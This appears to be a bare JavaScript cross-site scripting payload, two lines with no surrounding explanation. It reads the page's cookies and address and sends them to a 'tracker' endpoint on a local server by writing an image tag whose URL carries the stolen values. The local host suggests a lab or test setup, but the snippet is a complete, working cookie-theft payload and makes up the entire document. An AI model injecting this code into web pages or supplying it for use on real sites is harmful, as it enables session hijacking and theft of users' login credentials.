
var url = 'http://localhost:8081/tracker?cookies=' + encodeURI(document.cookie) + '&site=' + encodeURI(window.location);
document.write('<img src=\"'+ url +'\"/>');